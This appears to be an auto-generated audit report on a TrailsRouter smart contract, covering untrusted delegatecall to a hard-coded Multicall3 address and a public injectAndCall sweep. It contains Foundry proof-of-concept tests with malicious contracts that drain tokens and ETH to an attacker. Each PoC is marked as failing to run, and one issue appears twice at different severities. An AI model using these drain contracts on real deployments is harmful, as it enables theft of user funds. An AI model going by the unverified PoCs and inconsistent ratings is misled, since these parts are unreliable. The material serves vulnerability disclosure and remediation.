# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern

USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = false; and gpt-5.1
NICHE_PATTERN_ANALYSIS_MODE = false;


 **Derived From** : Delegatecall to external Multicall3 at fixed address without code validation

[H-1]. Untrusted delegatecall to hard‑coded Multicall3 lets malicious contract steal funds from TrailsRouter and wallet contexts
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
[M-2]. Untrusted delegatecall to fixed Multicall3 address lets malicious implementation steal all user-approved tokens and hijack wallets
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Public injectAndCall lets anyone drain ERC20/ETH held by TrailsRouter implementation

[L-3]. Public injectAndCall allows arbitrary sweep of TrailsRouter implementation ERC20/ETH balances
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Tstorish transient-storage flag collides with wallet storage in delegatecall context

[M-4]. Delegatecall storage collision in TrailsRouter.validateOpHashAndSweep can brick sentinel-gated sweeps on pre-TSTORE chains
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 8
Privilege: Permissionless



 **Derived From** : Balance injection leaves lingering ERC20 approvals from wallet to arbitrary targets

[H-5]. Balance injection in TrailsRouter._injectAndExecuteCall leaves wallet-wide ERC20 allowance to arbitrary targets, enabling unauthorized drains
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 2
- M: 2
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Delegatecall to external Multicall3 at fixed address without code validation

## [H-1]. Untrusted delegatecall to hard‑coded Multicall3 lets malicious contract steal funds from TrailsRouter and wallet contexts

### Finding Severity Justification: Delegatecalling an unvalidated, externally-controlled address that is assumed to host Multicall3 allows arbitrary code execution in the caller’s context. For direct TrailsRouter calls, any tokens just pulled from the user (or held by the router) can be stolen. In the intended delegatecall context (Sequence v3 wallet -> Router -> MULTICALL3), a malicious contract at 0xcA11… would execute as the wallet itself and can drain all wallet funds or corrupt its storage. This represents full compromise of user assets on any chain where 0xcA11… is not the canonical Multicall3, so the impact is complete loss of funds with a realistic deployment-front‑running scenario.
## Derived From Pattern/Invariant
Delegatecall to external Multicall3 at fixed address without code validation

## Exploit Type
UntrustedDelegateCall

## Location
TrailsRouter.pullAmountAndExecute

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter forwards arbitrary calldata to a hard‑coded external Multicall3 address via delegatecall without validating that the code at that address is the expected canonical Multicall3 implementation.

Relevant code:

- In `TrailsRouter.execute`:

`(bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);`

- In `TrailsRouter.pullAmountAndExecute` (also reached via `pullAndExecute`):

`(bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);`

The only validation done before the delegatecall is `_validateRouterCall(data)`, which checks:
- the function selector equals `0x174dea71` (Multicall3.aggregate3Value), and
- all decoded `Call3Value` entries have `allowFailure == false`.

There is **no on‑chain verification** that:
- code actually exists at `MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11`,
- the codehash matches the canonical Multicall3 bytecode, or
- the contract respects the expected semantics.

Because the router is:
- callable directly by any EOA (`execute`, `pullAndExecute`, `pullAmountAndExecute` are not `onlyDelegatecall`), and
- also designed to be executed via `delegatecall` from Sequence v3 wallets (so that the router runs in the wallet’s storage/balance context),

a malicious contract at `0xcA11…` can execute **arbitrary logic in the caller’s storage context**:

1. When TrailsRouter is used directly, a malicious Multicall3 can:
   - run inside the **TrailsRouter’s** context, and
   - freely move any ERC‑20 tokens or ETH that `pullAndExecute` / `pullAmountAndExecute` just pulled into the router from the user.

2. When TrailsRouter is invoked via `delegatecall` from a Sequence wallet (the primary intended flow), the call stack is:

`SequenceWallet (storage/balance) -> delegatecall Router -> delegatecall MULTICALL3`

In this case, the malicious Multicall3 code runs inside the **Sequence wallet’s** storage/balance context. It can:
- transfer out all ERC‑20 tokens or ETH held by the wallet,
- arbitrarily manipulate wallet storage (including sentinels, configuration, or other modules),
- make further external calls or delegatecalls as the wallet, bypassing normal signature and module checks.

Since the address is hard‑coded and never checked, the safety of all calls to `execute` / `pullAndExecute` / `pullAmountAndExecute` depends entirely on an **off‑chain assumption** that `0xcA11…` is always the correct Multicall3 deployment on every chain where TrailsRouter is used. On any chain where:
- `0xcA11…` has not been deployed yet and an attacker front‑runs by deploying a malicious contract there, or
- `0xcA11…` has been deployed to non‑canonical or compromised bytecode,

an unprivileged attacker can cause users who interact with TrailsRouter (directly or via Sequence intents) to have their funds drained.

This is a textbook UntrustedDelegateCall issue: delegatecall to an immutable, external address with no codehash/interface verification, combined with flows that intentionally pull user funds into the calling context and/or run inside wallets via delegatecall.

## Impact
On a network where address 0xcA11bde05977b3631167028862bE2a173976CA11 does not contain the canonical Multicall3 implementation (e.g., an attacker front‑runs deployment or the address is otherwise compromised), a malicious contract at that address can fully control execution in the caller’s context. For direct use of TrailsRouter, this allows theft of any ERC‑20 tokens or ETH the router just pulled from the user in `pullAndExecute` / `pullAmountAndExecute`. When used via delegatecall from Sequence wallets (the intended flow), the malicious Multicall3 runs in the wallet’s storage/balance context and can transfer out all wallet funds, corrupt wallet storage, or perform arbitrary external calls as the wallet. The blast radius is the full balance of every wallet or router instance invoking `execute`/`pull*Execute` on such a chain.

## Command to Run Test


## Proof of Concept
Scenario: an attacker front‑runs canonical Multicall3 deployment on a new chain and deploys a malicious contract to 0xcA11… that steals tokens from the caller when `aggregate3Value` is invoked.

1. Attacker deploys `MaliciousMulticall3` implementing `IMulticall3.aggregate3Value` but instead of performing multicalls, it:
   - reads the ERC‑20 balance of `address(this)` (which will be TrailsRouter during delegatecall), and
   - transfers the entire balance to the attacker address, then
   - returns a dummy `Result[]` so decoding in `TrailsRouter` succeeds.

2. A victim holds ERC‑20 tokens and approves `TrailsRouter` to spend them.

3. The victim calls `TrailsRouter.pullAmountAndExecute(token, amount, data)` with:
   - `token` = victim’s ERC‑20,
   - `amount` = amount to route via Trails,
   - `data` = ABI‑encoded `IMulticall3.aggregate3Value` calls array (with any valid `Call3Value[]` where all `allowFailure == false`) so `_validateRouterCall` passes.

4. Inside `pullAmountAndExecute`:
   - `_safeTransferFrom(token, msg.sender, address(this), amount)` pulls `amount` tokens from the victim into `TrailsRouter`.
   - The router executes `MULTICALL3.delegatecall(data)`, which actually delegatecalls the malicious contract at `0xcA11…`.

5. Because this is a delegatecall, `address(this)` inside `MaliciousMulticall3` is `TrailsRouter`. The malicious code transfers the router’s entire token balance to the attacker.

6. The delegatecall returns a superficially valid `Result[]`, so `pullAmountAndExecute` completes without reverting. The victim sees their transaction succeed, but the tokens they intended to route via Trails were stolen by the attacker.

The exact same pattern applies (with far higher impact) when TrailsRouter is invoked via `delegatecall` from Sequence wallets: in that case the malicious Multicall3 is running as the wallet itself, and can transfer *all* wallet‑held funds, not just the tokens purposefully pulled into TrailsRouter.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousMulticall3 is IMulticall3 {
    address public immutable attacker;
    IERC20 public immutable token;

    constructor(address _attacker, address _token) {
        attacker = _attacker;
        token = IERC20(_token);
    }

    // Called via delegatecall from TrailsRouter
    function aggregate3Value(Call3Value[] calldata) external payable override returns (Result[] memory results) {
        // Because this is delegatecall, address(this) is TrailsRouter
        uint256 bal = token.balanceOf(address(this));
        token.transfer(attacker, bal);
        results = new Result[](1);
        results[0] = Result({success: true, returnData: ""});
    }

    function aggregate3(Call3[] calldata) external payable override returns (Result[] memory results) {
        results = new Result[](0);
    }
}

contract TrailsRouter_UntrustedMulticall3_ExploitTest is Test {
    TrailsRouter router;
    MockERC20 token;
    address attacker = address(0xBEEF);
    address victim = address(0xCAFE);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();

        // Victim gets tokens and approves TrailsRouter
        token.mint(victim, 100 ether);
        vm.prank(victim);
        token.approve(address(router), type(uint256).max);

        // Deploy malicious multicall and overwrite code at the router's MULTICALL3 address
        MaliciousMulticall3 mal = new MaliciousMulticall3(attacker, address(token));
        vm.etch(router.MULTICALL3(), address(mal).code);
    }

    function testExploit_PullAmountAndExecuteDrainsTokens() public {
        uint256 amount = 10 ether;

        // Build minimal aggregate3Value calldata accepted by _validateRouterCall
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](0);
        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        vm.prank(victim);
        router.pullAmountAndExecute(address(token), amount, data);

        // Victim lost tokens, attacker gained them, router holds none
        assertEq(token.balanceOf(victim), 90 ether, "victim balance reduced");
        assertEq(token.balanceOf(attacker), amount, "attacker stole pulled tokens");
        assertEq(token.balanceOf(address(router)), 0, "router drained");
    }
}


## Suggested Mitigation
Avoid delegating to an unvalidated external contract at a fixed address. Safer options:

1) **Inline or hard‑link Multicall logic**: Move the aggregate3/aggregate3Value loop directly into TrailsRouter so no external delegatecall is required. This preserves the current semantics (calls executed from the wallet/router context) without trusting an external contract address.

2) **If Multicall3 must remain external, never use delegatecall:**
   - Replace `MULTICALL3.delegatecall(data)` with a normal `MULTICALL3.call(data)`.
   - Adjust flows so that any approvals/balances needed are granted to the external Multicall3 address instead of relying on wallet context. This removes the ability for a malicious Multicall3 to corrupt caller storage, though it still must be trusted not to misbehave.

3) **At minimum, enforce codehash validation:**
   - On deployment (or lazily on first use), read `extcodesize` and `extcodehash` of `MULTICALL3`.
   - Compare against a compile‑time constant of the canonical Multicall3 bytecode hash for the network(s) you support.
   - If the address is empty or the codehash does not match, revert and never execute delegatecall.

Option (1) provides the strongest safety by eliminating the untrusted delegatecall entirely; options (2) and (3) are weaker but still significantly reduce or remove the ability for an attacker‑controlled contract at 0xcA11… to compromise user wallets or stolen tokens.


## [M-2]. Untrusted delegatecall to fixed Multicall3 address lets malicious implementation steal all user-approved tokens and hijack wallets

### Finding Severity Justification: If the address 0xcA11...CA11 on a deployed chain does not contain the canonical Multicall3 implementation and instead holds malicious code, every call to execute / pullAndExecute / pullAmountAndExecute will delegatecall that malicious code. In the normal (intended) path where TrailsRouter is delegatecalled from a Sequence wallet, this means arbitrary logic executes in the wallet context and can drain all the wallet’s assets or corrupt storage (full compromise). Even when used standalone, any user who has approved the router can have their approved ERC20 balances drained. The impact is clearly high (unbounded loss of funds per affected chain). However, the attack requires a misconfigured or adversarial deployment environment where 0xcA11...CA11 is not the canonical Multicall3, and the protocol explicitly assumes deployment only on chains where that singleton is correctly deployed. Given this explicit architectural assumption, the practical likelihood is lower, which aligns with Code4rena’s rubric for a Medium: high impact but reliant on an external environmental condition (incorrect or malicious Multicall3 at that address).
## Derived From Pattern/Invariant
Delegatecall to external Multicall3 at fixed address without code validation

## Exploit Type
UntrustedDelegateCall

## Location
TrailsRouter.execute / pullAndExecute / pullAmountAndExecute

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter hardcodes the Multicall3 address and delegatecalls into it without any on-chain validation of the implementation, turning it into an untrusted delegatecall primitive.

In TrailsRouter:

    address public immutable MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;

    function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
        _validateRouterCall(data);
        (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
        if (!success) revert TargetCallFailed(returnData);
        return abi.decode(returnData, (IMulticall3.Result[]));
    }

    function pullAmountAndExecute(address token, uint256 amount, bytes calldata data)
        public
        payable
        returns (IMulticall3.Result[] memory returnResults)
    {
        _validateRouterCall(data);
        if (token == address(0)) {
            if (msg.value < amount) revert InsufficientEth(amount, msg.value);
        } else {
            _safeTransferFrom(token, msg.sender, address(this), amount);
        }

        (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
        if (!success) revert TargetCallFailed(returnData);
        return abi.decode(returnData, (IMulticall3.Result[]));
    }

The router only validates that the calldata selector is `aggregate3Value` and that `allowFailure == false` for all calls. It never checks that the contract at `MULTICALL3` actually contains the canonical Multicall3 code (no `extcodesize`/`codehash` validation) and it never constrains what that code does.

Impact:

1. **Direct router usage (no Sequence wallet):** Many users will approve `TrailsRouter` for ERC‑20 tokens (often with unlimited allowance) to use `pullAndExecute` / `pullAmountAndExecute`. If on any chain `0xcA11bde05977b3631167028862bE2a173976CA11` hosts a malicious contract, a call to `execute` / `pull*AndExecute` will delegatecall that malicious code **in the router’s context** (`address(this) == TrailsRouter`). The malicious implementation can then:
   * Invoke `IERC20(token).transferFrom(victim, attacker, amount)` for any `victim` who has granted allowance to `TrailsRouter`, because calls originate from `address(this) == TrailsRouter` at the token level. This allows draining **all allowances** users have ever given to `TrailsRouter` across all tokens.
   * Arbitrarily forward native ETH or ERC‑20 balances held by the router (e.g., from `pullAmountAndExecute`) to the attacker.

2. **Sequence wallet delegatecall context:** In the normal Trails flow, `TrailsRouter` itself is `delegatecall`ed from a Sequence v3 wallet via `TrailsRouterShim`. In that context, `address(this)` during the `MULTICALL3.delegatecall(data)` call is the **wallet**, so any malicious logic at `MULTICALL3` executes with full write access to the wallet’s storage and full control over its balances. A malicious Multicall3 implementation can:
   * Call arbitrary external contracts from the wallet, draining all ERC‑20 tokens and native ETH held by the wallet.
   * Corrupt the wallet’s storage (including signers, modules, or Trails sentinels stored via `Tstorish`), effectively bricking or taking over the account.

Because the target address is immutable and external to this repo, and there is no on-chain verification that it holds the expected canonical Multicall3 implementation on each chain, this delegatecall fits the UntrustedDelegateCall pattern and enables complete compromise whenever `0xcA11…CA11` is missing, spoofed, or replaced on a deployed chain.

## Impact
If the fixed Multicall3 address hosts malicious code on a given chain, any attacker can call TrailsRouter.execute or pull*AndExecute to delegate arbitrary logic into whatever context is currently executing the router. When TrailsRouter is used directly, that context is the router contract itself, so a malicious Multicall3 can arbitrarily spend any ERC-20 allowances that users have granted to TrailsRouter and drain native/erc20 balances held by it. When TrailsRouter is delegatecalled from a Sequence wallet (the intended production flow), the same delegatecall to MULTICALL3 executes in the wallet’s context, giving the malicious implementation arbitrary code execution over the wallet: it can drain all assets held by the wallet and corrupt its storage (including signers and modules). The loss is unbounded across all users on that chain and is triggered solely by the presence of non-canonical code at the fixed Multicall3 address.

## Command to Run Test


## Proof of Concept
To see how an attacker can exploit this, consider two deployment environments:

1) Direct TrailsRouter usage (no Sequence delegatecall):

- Victim approves TrailsRouter for an ERC20 token to use pullAndExecute / pullAmountAndExecute (often with unlimited allowance).
- On a specific chain, address 0xcA11bde05977b3631167028862bE2a173976CA11 is not the canonical Multicall3 implementation but an attacker-controlled contract that exposes an aggregate3Value function with the expected ABI.
- The attacker’s aggregate3Value implementation ignores the usual multicall semantics and instead, for each Call3Value, decodes callData as (victim, amountToSteal) and executes IERC20(target).transferFrom(victim, attacker, amountToSteal).
- Because TrailsRouter calls MULTICALL3.delegatecall(data), the malicious aggregate3Value runs in the router’s context. At the token level, msg.sender is address(TrailsRouter), so any allowance that victim previously gave to TrailsRouter can be used to transfer tokens to attacker.
- The attacker crafts a Call3Value[] array with a single element:
  - target = address(token)
  - allowFailure = false
  - value = 0
  - callData = abi.encode(victim, stealAmount)
  and encodes data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls).
- _validateRouterCall passes because selector == aggregate3Value and allowFailure is false.
- Attacker calls router.execute(data). The delegatecall jumps into the malicious Multicall3 code, which calls transferFrom from the router context and drains the victim’s allowance.

2) Sequence wallet context (TrailsRouter delegatecalled from a wallet via Shim):

- A Sequence wallet delegatecalls TrailsRouter through TrailsRouterShim as part of a Trails intent execution.
- Inside that delegatecall, address(this) is the Sequence wallet, but TrailsRouter’s code is executing in its storage/balance context.
- When TrailsRouter.execute runs, it performs MULTICALL3.delegatecall(data). Because this is a delegatecall from within a delegatecall, the execution context remains the wallet (address(this) == wallet) while running the Multicall3 code.
- If the contract at MULTICALL3 is malicious, its aggregate3Value can:
  - Call arbitrary external contracts to transfer out all ERC20 and native balance held by the wallet.
  - Write to any storage slot in the wallet, including signers/modules or any TrailsSentinelLib slots, effectively taking over or bricking the wallet.
- This requires no additional approvals beyond the intent itself; the only environmental precondition is that 0xcA11…CA11 does not contain the canonical trusted Multicall3 implementation on that chain.

In both environments, the hardcoded immutable MULTICALL3 address is treated as trusted code and invoked via delegatecall without verifying its codehash, so any non-canonical implementation at that address becomes a full arbitrary-code-execution primitive.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

contract MaliciousMulticall3 is IMulticall3 {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // Only the function actually used in the PoC needs a body
    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory results) {
        results = new Result[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            address token = calls[i].target;
            (address victim, uint256 amount) = abi.decode(calls[i].callData, (address, uint256));
            // This executes in the TrailsRouter context due to delegatecall,
            // so IERC20(token).transferFrom sees msg.sender == address(TrailsRouter)
            IERC20(token).transferFrom(victim, attacker, amount);
            results[i] = Result({success: true, returnData: ""});
        }
    }

    function aggregate3(Call3[] calldata) external payable returns (Result[] memory results) {
        revert("unused");
    }
}

contract UntrustedDelegatecallTest is Test {
    TrailsRouter router;
    MockERC20 token;
    address attacker;
    address victim;

    function setUp() public {
        // Deploy router and token
        router = new TrailsRouter();
        token = new MockERC20();

        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        // Give victim some tokens
        token.transfer(victim, 100 ether);

        // Victim approves the router for unlimited amount
        vm.prank(victim);
        token.approve(address(router), type(uint256).max);

        // Deploy malicious Multicall3 and place its code at router.MULTICALL3()
        MaliciousMulticall3 malicious = new MaliciousMulticall3(attacker);
        address multicallAddr = router.MULTICALL3();
        vm.etch(multicallAddr, address(malicious).code);
    }

    function test_MaliciousMulticall3DrainsApprovedTokens() public {
        uint256 stealAmount = 10 ether;

        // Build a single Call3Value entry that our malicious Multicall3
        // will interpret as (token, victim, amount)
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: abi.encode(victim, stealAmount)
        });

        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        uint256 victimBefore = token.balanceOf(victim);
        uint256 attackerBefore = token.balanceOf(attacker);

        // Any address can trigger the router; attacker does so here
        vm.prank(attacker);
        router.execute(data);

        uint256 victimAfter = token.balanceOf(victim);
        uint256 attackerAfter = token.balanceOf(attacker);

        assertEq(victimAfter, victimBefore - stealAmount, "victim should lose tokens");
        assertEq(attackerAfter, attackerBefore + stealAmount, "attacker should gain tokens");
    }
}


## Suggested Mitigation
The core issue is the use of delegatecall to a hardcoded external address without enforcing that the code at that address is the canonical, trusted Multicall3 implementation.

To fully mitigate:

1) Prefer removing the external delegatecall entirely

- Inline the minimal aggregate3Value behaviour directly in TrailsRouter, iterating over IMulticall3.Call3Value and using call (and value forwarding) to each target.
- For the Sequence wallet flow where preserving the wallet’s msg.sender is desired, ensure that the router itself is the only delegatecall target from the wallet, and that any multicall logic lives inside the router codebase rather than at an external address.

This keeps all executed code within contracts that are part of the audited deployment and avoids trusting a singleton that may not exist or may differ on some chains.

2) If an external Multicall3 contract must be reused and delegatecall is required

- Keep MULTICALL3 immutable, but add a strict constructor-time code validation:
  - Compute the expected codehash (or keccak256 of the exact runtime bytecode) of the canonical Multicall3 implementation.
  - In TrailsRouter’s constructor, fetch MULTICALL3.code.length and MULTICALL3.codehash and require that code.length > 0 and codehash == EXPECTED_CODEHASH.
  - If the check fails, revert deployment so that the router cannot exist on chains where 0xcA11…CA11 is missing or contains unexpected code.
- Optionally, also perform the same codehash check in execute / pull*AndExecute and revert if it no longer matches (to guard against chains that allow self-destruct/redeployment at the same address).

3) If delegatecall to an external Multicall3 is not strictly required

- Replace MULTICALL3.delegatecall(data) with MULTICALL3.call{value: msg.value}(data) (or appropriate value forwarding) and adjust logic to read results from the external call instead of router storage.
- This ensures that even if the external contract is malicious, it cannot corrupt TrailsRouter or wallet storage; it will only be able to affect its own state and the external targets it calls, which should already be untrusted.

By either inlining the multicall logic under the project’s direct control or enforcing strict, immutable codehash validation on the external singleton (and preferably also avoiding delegatecall where it’s not required), the untrusted-delegatecall primitive is removed and a malicious implementation at 0xcA11…CA11 can no longer be used to compromise user funds or wallet state.





 **Derived From** : Public injectAndCall lets anyone drain ERC20/ETH held by TrailsRouter implementation

## [L-3]. Public injectAndCall allows arbitrary sweep of TrailsRouter implementation ERC20/ETH balances

### Finding Severity Justification: The described behavior is real: anyone can call injectAndCall on the TrailsRouter singleton to move any ETH or ERC20 tokens that reside on the router’s own address. However, the router is explicitly designed as a stateless helper that must be used via delegatecall from Sequence wallets; user funds are meant to live in wallets/intent contracts, not on the router. Any assets at the router address arise from mis-sends or misuse, which the documentation for similar patterns (and even examples like LidoWrapper in the repo) explicitly treat as unsafe and MEV-drainable. Under Code4rena rules, loss due to user or integrator mistakes (sending tokens to the wrong contract) is at most QA/Low and does not qualify as protocol asset loss. No in-scope flow relies on holding balances on the router, and no intended user capital is at risk under correct integration.
## Derived From Pattern/Invariant
Public injectAndCall lets anyone drain ERC20/ETH held by TrailsRouter implementation

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter is designed so that balance-injection for Sequence wallets happens via delegatecall, where address(this) refers to the wallet, not the router singleton. For that path the router exposes an internal helper _injectAndCallDelegated which is only reached via handleSequenceDelegateCall guarded by onlyDelegatecall. However, the external function injectAndCall is also exposed as a public entrypoint and is not protected by onlyDelegatecall, even though its documentation says it is for delegatecalls from Sequence wallets.

When injectAndCall is called directly on the TrailsRouter implementation, it computes callerBalance from the router contract's own balance using _getSelfBalance(token) and then forwards this to _injectAndExecuteCall:

function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }
    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}

Inside _injectAndExecuteCall, for ERC20 it unconditionally grants the target an allowance over the router's entire balance, then calls target:

if (token == address(0)) {
    (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
    ...
} else {
    IERC20 erc20 = IERC20(token);
    SafeERC20.forceApprove(erc20, target, callerBalance);
    (bool success, bytes memory result) = target.call(callData);
    ...
}

There is no access control tying this operation to the original depositor or to any authenticated context. Any external account can:

- For native ETH: call injectAndCall with token == address(0), arbitrary target, and any callData. The router forwards its entire ETH balance to target, which can immediately forward it to the attacker.
- For ERC20: call injectAndCall with token set to an ERC20 address and target set to an attacker-controlled contract. _injectAndExecuteCall executes SafeERC20.forceApprove(token, target, routerBalance), approving the attacker contract to transfer the full router balance of that token, then calls the attacker contract. Within that call, the attacker contract uses transferFrom(router, attacker, routerBalance) to drain all tokens.

Because injectAndCall operates on the router implementation's own balance (address(this)) and lacks an onlyDelegatecall guard or any ownership/role checks, any ERC20 or ETH that ever sits on the TrailsRouter implementation (due to mis-sends, mistaken integrations, or partial refunds from downstream protocols) becomes publicly stealable by the first caller. This is an access control bypass on balance management of the router implementation.

## Impact
Any ERC20 tokens or ETH accidentally or temporarily held by the TrailsRouter implementation contract can be fully stolen. Instead of such funds being inert or recoverable only by the original depositor, they can be swept to an arbitrary attacker-controlled address. In flows where integrators use the router in standalone mode (for example via injectSweepAndCall or Multicall3 delegatecalls) and leave residual balances on the router, an external attacker can unilaterally exfiltrate those balances, resulting in direct loss of user or protocol funds.

## Command to Run Test


## Proof of Concept
High level exploitation steps for ERC20:

1. Assume some ERC20 tokens are held by the deployed TrailsRouter implementation contract, e.g. because a user or integrator transferred tokens to the router address directly, or a downstream protocol refunded leftover tokens to the router.
2. The attacker deploys a malicious target contract with a function drainERC20(token, router, recipient) that reads the router's token balance and calls IERC20(token).transferFrom(router, recipient, balance).
3. The attacker calls TrailsRouter.injectAndCall with:
   - token = address of the ERC20,
   - target = address of the malicious contract,
   - callData = abi.encodeWithSelector(MaliciousTarget.drainERC20.selector, token, routerAddress, attackerAddress),
   - amountOffset = 0,
   - placeholder = 0.
4. Inside injectAndCall, callerBalance is set to IERC20(token).balanceOf(address(this)) which is the router's full ERC20 balance.
5. _injectAndExecuteCall executes SafeERC20.forceApprove(token, target, callerBalance), granting the malicious target an allowance equal to the entire router balance, then calls target.
6. Inside MaliciousTarget.drainERC20, msg.sender is the router, and the malicious contract calls IERC20(token).transferFrom(routerAddress, attackerAddress, balance). Since allowance[routerAddress][maliciousTarget] == balance, this succeeds and transfers all tokens to the attacker.

High level exploitation steps for native ETH:

1. Assume some ETH is held by the TrailsRouter implementation, e.g. from a mistaken transfer to its receive() function or from a protocol sending ETH directly to the router.
2. The attacker deploys a malicious target contract with a payable function drainETH(recipient) that forwards its full ETH balance to recipient.
3. The attacker calls TrailsRouter.injectAndCall with:
   - token = address(0),
   - target = address of the malicious contract,
   - callData = abi.encodeWithSelector(MaliciousTarget.drainETH.selector, attackerAddress),
   - amountOffset = 0,
   - placeholder = 0.
4. injectAndCall sets callerBalance to address(this).balance (the router's full ETH balance) and calls _injectAndExecuteCall.
5. In the native branch of _injectAndExecuteCall, the router executes target.call{value: callerBalance}(callData), sending all ETH to the malicious target.
6. MaliciousTarget.drainETH immediately forwards the ETH to the attacker-controlled address.

In both cases, the attacker does not need any privileges or prior interaction with the protocol; they only require that the router implementation currently holds some ERC20 or ETH balance.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor() ERC20("TestToken", "TTK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousTarget {
    function drainERC20(address token, address router, address recipient) external {
        uint256 bal = IERC20(token).balanceOf(router);
        IERC20(token).transferFrom(router, recipient, bal);
    }

    function drainETH(address recipient) external payable {
        (bool ok,) = payable(recipient).call{value: address(this).balance}("");
        require(ok, "eth drain failed");
    }

    receive() external payable {}
}

contract InjectAndCallExploitTest is Test {
    TrailsRouter router;
    TestToken token;
    address attacker = address(0xA11CE);

    function setUp() public {
        router = new TrailsRouter();
        token = new TestToken();
    }

    function test_erc20_injectAndCall_drain_router_balance() public {
        address victim = address(0xBEEF);
        uint256 amount = 100 ether;

        // Victim accidentally or indirectly sends ERC20 to the router implementation
        token.mint(victim, amount);
        vm.prank(victim);
        token.transfer(address(router), amount);

        assertEq(token.balanceOf(address(router)), amount);

        // Attacker deploys malicious target and drains the router balance via injectAndCall
        MaliciousTarget mal = new MaliciousTarget();

        vm.prank(attacker);
        router.injectAndCall(
            address(token),
            address(mal),
            abi.encodeWithSelector(
                MaliciousTarget.drainERC20.selector,
                address(token),
                address(router),
                attacker
            ),
            0,
            bytes32(0)
        );

        assertEq(token.balanceOf(address(router)), 0);
        assertEq(token.balanceOf(attacker), amount);
    }

    function test_eth_injectAndCall_drain_router_balance() public {
        address victim = address(0xB0B);
        uint256 amount = 10 ether;

        // Victim sends ETH directly to the router implementation
        vm.deal(victim, amount);
        vm.prank(victim);
        (bool sent,) = address(router).call{value: amount}("");
        require(sent, "fund router");

        assertEq(address(router).balance, amount);

        // Attacker drains ETH via injectAndCall
        MaliciousTarget mal = new MaliciousTarget();

        vm.prank(attacker);
        router.injectAndCall(
            address(0),
            address(mal),
            abi.encodeWithSelector(
                MaliciousTarget.drainETH.selector,
                attacker
            ),
            0,
            bytes32(0)
        );

        assertEq(address(router).balance, 0);
        assertEq(attacker.balance, amount);
    }
}


## Suggested Mitigation
Restrict injectAndCall so it can only be used in the intended delegatecall context of a Sequence wallet. The simplest fix is to add the onlyDelegatecall modifier and reuse the existing delegated helper:

function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) external payable onlyDelegatecall {
    _injectAndCallDelegated(token, target, callData, amountOffset, placeholder);
}

